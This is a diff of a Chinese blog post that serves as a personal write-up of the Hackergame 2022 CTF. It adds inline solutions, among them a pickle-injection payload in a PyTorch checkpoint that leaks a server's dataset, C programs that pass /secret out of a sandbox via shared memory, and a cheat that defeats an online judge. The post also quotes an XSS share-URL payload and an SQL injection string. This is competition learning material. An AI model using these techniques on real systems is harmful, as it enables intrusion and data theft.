@@ -2,49 +2,53 @@
 title: "Hackergame 2022 题解"
 date: 2022-10-31
 lastmod: 2022-10-31
+draft: false
 keywords: ["Hackergame"]
 description: ""
 tags: ["Hackergame", "CTF"]
 categories: []
 author: ""
-summary: ""
 
 comment: false
-toc: false
-autoCollapseToc: true
+toc: true
+autoCollapseToc: false
 contentCopyright: false
 reward: false
-katex: true
+mathjax: true
 ---
-
-
 
 Hackergame 2022（中科大第九届信息安全大赛）个人题解
 
+<!--more-->
+
+今年得分 7350，总榜 15。
+
 ![board](/post/hackergame2022/image/board.png)
 
-<!--more-->
+题目及其余题解可以在 [hackergame2022-writeups](https://github.com/USTC-Hackergame/hackergame2022-writeups) 中查看
+
 
 ## 环境
 
 + Debian Bookworm
 + Python 3.10
 
+
 ## 完成的题目
 
-### 16 二次元神经网络
+### 16. 二次元神经网络
 
 > 2022 年 10 月 22 日 12 时，Hackergame 2022 正式开始
-
-签到、Xcaptcha、Latex 机器人各做了十几分钟，然而都没做出来
+>
+> 签到、Xcaptcha、Latex 机器人各做了十几分钟，然而都没做出来
 
 > 12:40 - 13:30
-
-开始炼这题的丹。感觉参数量有点小，Loss 不太能降的下来
+>
+> 开始炼这题的丹。感觉参数量有点小，Loss 不太能降的下来
 
 > 14:20
-
-发现这题是 web 类型的题目，感觉并不是让我们训练网络或者解不等式。
+>
+> 发现这题是 web 类型的题目，感觉并不是让我们训练网络或者解不等式。
 
 我对 AI 绘画很感兴趣，之前 bilibili 上 NovelAI 相关的视频看了不少。其中有一个 [你的NovelAI模型，极有可能被恶意攻击](https://www.bilibili.com/video/BV1BN4y1c7KX/) 提到了 pickle 模块可能存在安全问题。但是里面的代码只展示了 pkl 文件的读取和写入，没有 pt 文件的读取和写入。
 
@@ -58,13 +62,47 @@ Google 了好久，终于用 `pickle Serialization danger pytorch` 找到了一�
 
 实现时需要阻止在执行注入的代码后按照 pt 文件后面的数据保存结果。于是重写 `json.dump` 函数，让服务器在调用这个函数时把数据集的前十张图片导出到 `/tmp/result.json`
 
-> 完整代码见 [patch.py](22/patch.py)
+```python
+import torch
+import patch_torch_save
+from models import SimpleGenerativeModel
+
+def replaceWithDataset():
+    import json
+
+    def fun(a, b):
+        import io
+        import base64
+        import torch
+        import matplotlib.image
+
+        predictions = torch.load("dataset/pixels_10.pt", map_location="cpu")
+        gen_imgs = []
+        for i in range(10):
+            out_io = io.BytesIO()
+            matplotlib.image.imsave(out_io, predictions[i].numpy(), format="png")
+            png_b64 = base64.b64encode(out_io.getvalue()).decode()
+            gen_imgs.append(png_b64)
+
+        jsondump({"gen_imgs_b64": gen_imgs}, open("/tmp/result.json", "w"))
+
+    global jsondump
+    jsondump = json.dump
+    json.dump = fun
+
+patched_save_function = patch_torch_save.patch_save_function(replaceWithDataset)
+
+model = SimpleGenerativeModel(n_tags=63, dim=8, img_shape=(64, 64, 3))
+model.load_state_dict(torch.load("checkpoint/model.pt", map_location="cpu"))
+
+patched_save_function(model.state_dict(), "checkpoint/model2.pt")
+```
 
 感谢 Stable Diffusion，感谢 NovelAI，我拿到了第一个 flag，获得了这一题的一血，守护了科大这片二次元的土地。
 
 <br>
 
-### 1 签到
+### 1. 签到
 
 一开始点开签到，画了一下没画出来，开始把网页下载下来看代码。
 
@@ -72,7 +110,7 @@ Google 了好久，终于用 `pickle Serialization danger pytorch` 找到了一�
 
 <br>
 
-### 2 猫咪问答喵
+### 2. 猫咪问答喵
 
 1. 百度 `USTC NEBULA 成立时间`，[中国科大“星云战队”获信息安全铁人三项赛华东区企业赛冠军](https://www.cas.cn/djcx/wm/201706/t20170616_4605231.shtml) 中提到成立时间是 2017-03
 2. 找到 [gnome-wayland-user-perspective.pdf](https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdf)，里面的是 Kdenlive 的界面
@@ -86,7 +124,7 @@ Google 了好久，终于用 `pickle Serialization danger pytorch` 找到了一�
 
 <br>
 
-### 3 家目录里的秘密
+### 3. 家目录里的秘密
 
 #### VS Code 里的 flag
 
@@ -110,7 +148,7 @@ Google 了好久，终于用 `pickle Serialization danger pytorch` 找到了一�
 
 <br>
 
-### 4 HeiLang
+### 4. HeiLang
 
 正则表达式替换
 
@@ -138,15 +176,44 @@ with open('getflag.hei.py', 'w') as f:
 <br>
 
 
-### 5 Xcaptcha
+### 5. Xcaptcha
 
 使用 Python 的 Selenium 库，模拟人工操作。一开始代码写错了，用 Kazam 录屏后才发现错误
 
-代码见 [run.py](5/run.py)
+```python
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+import re
+
+# firefox
+driver = webdriver.Firefox()
+driver.get('http://202.38.93.111:10047')
+
+# input type="text"
+inputBox = driver.find_element(By.CSS_SELECTOR, 'input[type="text"]')
+inputBox.send_keys(
+    '1:MEUCIQC24dB6B24/LDr2O+4cifbzOEFDbkXg3hJIqTXuuvpa1QIgbzMM/F0uUmYIudtM6qEDvOpEHbtTZjSjTWMcA5zhnos= ')
+
+# input type="submit"
+# click img-fluid
+driver.find_element(By.CSS_SELECTOR, 'input[type="submit"]').click()
+driver.find_element(By.CLASS_NAME, 'img-fluid').click()
+
+# <label for="captcha1">160092426831461187501631690638141489463+53014117698106737620695077701380624357 的结果是？</label>
+# <input type="text" class="form-control" id="captcha1" name="captcha1" placeholder="请输入结果">
+for i in range(3):
+    captcha = driver.find_element(By.CSS_SELECTOR, 'label[for="captcha' + str(i + 1) + '"]').text
+    result = re.search(r'(.+) 的结果是', captcha).group(1)
+    ans = eval(result)
+    driver.find_element(By.CSS_SELECTOR, 'input[name="captcha' + str(i + 1) + '"]').send_keys(ans)
+
+# <button type="submit" class="btn btn-primary" id="submit">提交</button>
+driver.find_element(By.ID, 'submit').click()
+```
 
 <br>
 
-### 6 旅行照片 2.0
+### 6. 旅行照片 2.0
 
 #### 照片分析
 
@@ -163,7 +230,7 @@ KDE 自带的图片管理器可以显示图片的 EXIF 信息。
 <br>
 
 
-### 7 猜数字
+### 7. 猜数字
 
 每次有 10^-6 次方的概率一下子猜对，就算每次交互 1s，也要 11 天。所以不可能暴力。
 
@@ -187,7 +254,7 @@ var isPassed = !isLess && !isMore;
 <br>
 
 
-### 8 LaTeX 机器人
+### 8. LaTeX 机器人
 
 #### 纯文本
 
@@ -212,7 +279,7 @@ Copilot 教会我用 `\input`
 <br>
 
 
-### 9 Flag 的痕迹
+### 9. Flag 的痕迹
 
 一开始以为要找出用户名和密码。
 
@@ -226,7 +293,7 @@ http://202.38.93.111:15004/doku.php?id=start&do=diff
 
 <br>
 
-### 10 安全的在线测评
+### 10. 安全的在线测评
 
 #### 无法 AC 的题目
 
@@ -257,7 +324,38 @@ int main(int argc, char* argv[]) {
 
 [Embedding resources in executable using GCC](https://stackoverflow.com/questions/4158900/embedding-resources-in-executable-using-gcc) 中提到了 [incbin](https://github.com/graphitemaster/incbin) 这个库，可以包含数据文件
 
-代码见 [raw.c](10/raw.c)
+```c
+#include <stdio.h>
+#include "incbin.h"
+
+INCTXT(staticOut, "./data/static.out");
+INCTXT(dynamic0Out, "./data/dynamic0.out");
+INCTXT(dynamic1Out, "./data/dynamic1.out");
+INCTXT(dynamic2Out, "./data/dynamic2.out");
+INCTXT(dynamic3Out, "./data/dynamic3.out");
+INCTXT(dynamic4Out, "./data/dynamic4.out");
+
+char* indexToOut[] = {
+    staticOut_data, dynamic0Out_data, dynamic1Out_data, dynamic2Out_data, dynamic3Out_data, dynamic4Out_data,
+};
+
+int main() {
+    // read currentFile from currentFile
+    // if not exist, create it, currentFile = 0
+    FILE* fp = fopen("./temp/currentFile", "r");
+    int currentFile = 0;
+    if (fp != NULL) {
+        fscanf(fp, "%d", &currentFile);
+        fclose(fp);
+    }
+    // write currentFile + 1 to currentFile
+    fp = fopen("./temp/currentFile", "w");
+    fprintf(fp, "%d", currentFile + 1);
+    fclose(fp);
+
+    printf("%s", indexToOut[currentFile]);
+}
+```
 
 为了避免包含这个库，可以用 `gcc -E` 预处理一下，然后把没用的代码删掉，提交的文件见 [submit.c](10/submit.c)
 
@@ -265,17 +363,17 @@ int main(int argc, char* argv[]) {
 
 <br>
 
-### 11 线路板
+### 11. 线路板
 
 安装 Gerbv
 
 加载所有 `*.gbr` 文件，然后发现 `fla` 字样，把所有挡住的圆盘删掉，获得 flag。
 
-> 一开始装了个免费版的 Altium Designer，没用
+> 一开始装了个免费版的 Altium Designer，一点用都没有
 
 <br>
 
-### 12 Flag 自动机
+### 12. Flag 自动机
 
 直接打开有两个按钮，鼠标左键 + Alt + Space 乱按有概率颠倒按钮，但还是会显示没有管理员权限。
 
@@ -287,7 +385,7 @@ int main(int argc, char* argv[]) {
 
 <br>
 
-### 13 微积分计算小练习
+### 13. 微积分计算小练习
 
 `bot.py` 调用 selenium 打开网页。需要更改 URL 的参数获得 cookie
 
@@ -329,7 +427,7 @@ http://202.38.93.111:10056/share?result=OjxpbWcgc3JjPSIxIiBvbmVycm9yPWRvY3VtZW50
 
 <br>
 
-### 14 杯窗鹅影
+### 14. 杯窗鹅影
 
 #### flag1
 
@@ -387,7 +485,7 @@ int main(int argc, char* argv[]) {
 
 <br>
 
-### 15 蒙特卡罗轮盘赌
+### 15. 蒙特卡罗轮盘赌
 
 随机数种子取决于 `time(0) + clock()`。其中 `clock()` 表示程序运行的 CPU 时钟数，本地运行大概在 500-1500 之间。
 
@@ -395,12 +493,59 @@ int main(int argc, char* argv[]) {
 
 后来想到可以先随便输两个数字，把前两题的答案套出来，然后再枚举。
 
-代码见 [solve.c](15/solve.c)
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+#include <string.h>
 
+double rand01() {
+    return (double)rand() / RAND_MAX;
+}
+
+int main() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
+    int time0 = time(0);
+
+    char buf1[100] = "3.13801";
+    char buf2[100] = "3.14753";
+
+    for (int clock0 = 0; clock0 < 2000; clock0++) {
+        srand((unsigned)time0 + clock0);
+
+        int games = 5;
+        char target[20];
+        for (int i = games; i > 0; i--) {
+            int M = 0;
+            int N = 400000;
+            for (int j = 0; j < N; j++) {
+                double x = rand01();
+                double y = rand01();
+                if (x * x + y * y < 1)
+                    M++;
+            }
+            double pi = (double)M / N * 4;
+            sprintf(target, "%1.5f", pi);
+
+            if (i == 5) {
+                if (strcmp(target, buf1) != 0)
+                    break;
+            } else if (i == 4) {
+                if (strcmp(target, buf2) != 0)
+                    break;
+            } else
+                printf("clock0 = %d, i = %d, target = %s\n", clock0, i, target);
+        }
+    }
+    return 0;
+}
+```
 <br>
 
-
-### 17 惜字如金
+### 17. 惜字如金
 
 #### HS384
 
@@ -417,7 +562,7 @@ int main(int argc, char* argv[]) {
 
 <br>
 
-### 18 不可加密的异世界
+### 18. 不可加密的异世界
 
 #### 疏忽的神
 
@@ -474,7 +619,7 @@ $P_n = C_n$，为给定字符串的一个块，K 可以随意设置，利用上�
 <br>
 
 
-### 19 置换魔群
+### 19. 置换魔群
 
 #### 置换群上的 RSA
 
@@ -491,7 +636,7 @@ $$
 public ^ d = secret
 $$
 
-代码见 [RSA.py](19/RSA.py)
+完整代码见 [RSA.py](19/RSA.py)
 
 
 #### 置换群上的 DH
@@ -535,7 +680,7 @@ selectPrimesGen(primeList, n, True, [64, 49, 27, 25]),
 
 <br>
 
-### 20 光与影
+### 20. 光与影
 
 一开始以为改代码以后网页显示不出来是因为程序限制了 Hash，后来发现仅仅是还没编译出来而已
 
@@ -569,7 +714,7 @@ float sceneSDF(vec3 p, out vec3 pColor) {
 <br>
 
 
-### 23 链上记忆大师
+### 23. 链上记忆大师
 
 #### 记忆练习
 
@@ -594,7 +739,7 @@ contract MemoryMaster {
 
 <br>
 
-### 24 片上系统
+### 24. 片上系统
 
 #### 引导扇区
 
@@ -607,12 +752,13 @@ metadata 里提到了 Sigrok。首先，安装 Sigrok 和 PulseView。
 添加 SPI 解码器，设置变化最频繁的信号为 CLK，最不频繁的信号为 CS，其他两个随意。然后导出 txt，某个信号的最后一行 ASCII 解码后就是 flag
 
 > 第二问：
+>
 > 没配好 RISC-V 的反汇编环境。看到 `Video outputed` 以为前面的代码已经把字符输出到屏幕上了。
 
 
 <br>
 
-### 25 传达不到的文件
+### 25. 传达不到的文件
 
 `ps` 发现父进程是 `/etc/init.d/rcS`，这个文件设置了权限，它的最后几行是
 
@@ -653,7 +799,7 @@ exit
 
 <br>
 
-### 26 看不见的彼方
+### 26. 看不见的彼方
 
 `seccomp` 限制了网络的使用
 
@@ -661,14 +807,60 @@ exit
 
 找了个共享内存的代码 [进程间的通信方式（一）：共享内存](https://zhuanlan.zhihu.com/p/37808566)。但是由于不能访问相同目录，把 `ftok` 改成特定值即可（百度百科偶尔还是有用处的）
 
-> 完整代码见 [alice.c](26/alice.c) 和 [bob.c](26/bob.c)
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+
+#define BUFSZ 512
+
+int main() {
+    key_t key = 0x1234;
+    char secret[100];
+    // open file /secret and read
+    FILE* fp = fopen("/secret", "r");
+    fgets(secret, 100, fp);
+
+    int shmid = shmget(key, BUFSZ, IPC_CREAT | 0666);  // 创建共享内存
+    char* shmadd = shmat(shmid, NULL, 0);              // 映射
+    bzero(shmadd, BUFSZ);                              // 共享内存清空
+    strcpy(shmadd, secret);                            // 写入共享内存
+    return 0;
+}
+```
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/ipc.h>
+#include <sys/shm.h>
+
+#define BUFSZ 512
+
+int main() {
+    key_t key = 0x1234;
+    int shmid = shmget(key, BUFSZ, IPC_CREAT | 0666);  // 打开共享内存
+    char* shmadd = shmat(shmid, NULL, 0);              // 映射
+    printf("%s", shmadd);                              // 读共享内存区数据
+    int ret = shmdt(shmadd);                           // 分离共享内存和当前进程
+    shmctl(shmid, IPC_RMID, NULL);                     // 删除共享内存
+    return 0;
+}
+```
 
 > 如果上传提示 glibc 版本不兼容，在编译时加上 `-static`
 
 <br>
 
 
-### 27 量子藏宝图
+### 27. 量子藏宝图
 
 > 我看到数学公式就犯困
 
@@ -676,12 +868,13 @@ exit
 
 第二问，也找一份代码，把元件都标上，运行
 
-> 代码见 [qkd.py](27/qkd.py) 和 [BernsteinVaziraniAlgorithmSimple.ipynb](27/BernsteinVaziraniAlgorithmSimple.ipynb)，
+> 代码见 [qkd.py](27/qkd.py) 和 [BernsteinVaziraniAlgorithmSimple.ipynb](27/BernsteinVaziraniAlgorithmSimple.ipynb)
+>
 > 分别参考了 [videlanicolas/QKD](https://github.com/videlanicolas/QKD) 和 [atilsamancioglu/QX05-BernsteinVaziraniAlgorithmSimple](https://github.com/atilsamancioglu/QX05-BernsteinVaziraniAlgorithmSimple/)
 
 <br>
 
-### 28 《关于 RoboGame 的轮子永远调不准速度这件事》
+### 28. 《关于 RoboGame 的轮子永远调不准速度这件事》
 
 原来以为是要找漏洞。后来发现 `r T` 可以读数据
 
@@ -689,7 +882,7 @@ exit
 
 一开始想把随机数的值改掉，结果没有作用
 
-后来想把 + 9 改掉。结果把 3 号页的 9 抹掉以后，发现程序开始以奇怪的方式跑起来了，经过一段时间的观察，发现此时这个程序会按顺序分别将两边的数字设置为 1,0,1,2,0,0,0，而这道题目只需要出现连续 3 次相同的数字就可以过了。
+后来想把 `+ 9` 改掉。结果把 3 号页的 9 抹掉以后，发现程序开始以奇怪的方式跑起来了，经过一段时间的观察，发现此时这个程序会按顺序分别将两边的数字设置为 1,0,1,2,0,0,0，而这道题目只需要出现连续 3 次相同的数字就可以过了。
 
 
 ```
@@ -707,11 +900,11 @@ w 5 1 0     # 两边写 0    4 5 6 为 0
 
 然后把所有轮子的速度读出来，十六进制转 ASCII 就过了
 
-代码见 [script.py](28/script.py)
+发送信息及读取的代码见 [script.py](28/script.py)
 
 <br>
 
-### 30 企鹅拼盘
+### 30. 企鹅拼盘
 
 #### 这么简单我闭眼都可以！
 
@@ -729,7 +922,7 @@ w 5 1 0     # 两边写 0    4 5 6 为 0
 
 <br>
 
-### 32 火眼金睛的小 E
+### 32. 火眼金睛的小 E
 
 #### 有手就行
 
@@ -744,11 +937,17 @@ w 5 1 0     # 两边写 0    4 5 6 为 0
 
 ## 未完成
 
-| 题目名称           | 说明                                                         |
-| ------------------ | ------------------------------------------------------------ |
-| 21 矩阵之困        | 拿 z3 解了几个小时没解出来                                   |
-| 22 你先别急        | 发现可以 SQL 注入 `' or 1=1 #`。但我不太会 SQL 注入，不知道怎么继续 |
-| 29 壹...壹字节？   | 我只会把所有一字节的字符发给服务器                           |
-| 31 小 Z 的靓号钱包 | 配置好环境了，也知道随机数是 32 位的了。但代码有点没看懂     |
+| 题目名称           | 说明                                                                  |
+| ------------------ | --------------------------------------------------------------------- |
+| 21 矩阵之困        | 拿 z3 解了几个小时没解出来                                            |
+| 22 你先别急        | 发现可以 SQL 注入 `' or 1=1 #`。但我不太会 SQL 注入，不知道怎么继续   |
+| 29 壹...壹字节？   | 我只会把所有一字节的字符发给服务器                                    |
+| 31 小 Z 的靓号钱包 | 配置好环境了，也知道随机数是 32 位的了。但代码有点没看懂              |
 | 33 evilCallback    | 没发现有 `.diff` 文件，还以为要玄学测试。虽然发现了我大概率也做不出来 |
 
+
+## 总结
+
++ 最后一天起得不够早，虽然起得早也最多多做一道题
++ 勉强在比赛期间把 [CTF Wiki](https://ctf-wiki.org/) 翻了一遍，了解了 CTF 的常见题型
++ 从比赛的题目中也学到许多，比如从 [二次元神经网络](#16-二次元神经网络) 中知道了确实存在代码注入的漏洞，从 [传达不到的文件](#25-传达不到的文件) 中了解了通过劫持程序来实现越权
